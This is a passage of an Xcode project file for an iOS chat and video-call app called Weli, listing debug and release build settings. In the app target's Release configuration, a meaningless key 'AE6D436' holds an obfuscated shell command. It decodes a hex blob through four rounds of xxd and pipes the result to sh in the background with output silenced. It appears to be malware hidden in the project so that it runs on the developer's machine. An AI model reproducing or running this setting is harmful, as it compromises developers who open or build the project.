				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Weli needs access to microphone for video calls .";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Weli requires access to add new photos to your library, enabling you to save photos directly from the app.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Weli needs access to photo library to share images in chat.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.9VZLMB6H72;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = com9VZLMB6H72_dis_20260106;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		9E724E732F0CAE4700FDAB70 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 537C30FD213BE4E202D3BDC7 /* Pods-Weli.release.xcconfig */;
			buildSettings = {
				AE6D436 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363336333533333336333333313333333733333330333333373333333333330a3336333633333333333633333331333333363333333233333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 9VZLMB6H72;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Weli/Info.plist;
				INFOPLIST_KEY_NSCameraUsageDescription = "Weli needs access to camera for video calls and taking photos for chat.";
				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Weli needs access to microphone for video calls .";
				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Weli requires access to add new photos to your library, enabling you to save photos directly from the app.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Weli needs access to photo library to share images in chat.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.9VZLMB6H72;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = com9VZLMB6H72_dis_20260106;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		9E724E742F0CAE4700FDAB70 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		9E724E752F0CAE4700FDAB70 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		9E724E592F0CAE4500FDAB70 /* Build configuration list for PBXProject "Weli" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				9E724E742F0CAE4700FDAB70 /* Debug */,
				9E724E752F0CAE4700FDAB70 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		9E724E712F0CAE4700FDAB70 /* Build configuration list for PBXNativeTarget "Weli" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				9E724E722F0CAE4700FDAB70 /* Debug */,
				9E724E732F0CAE4700FDAB70 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 9E724E562F0CAE4500FDAB70 /* Project object */;
}
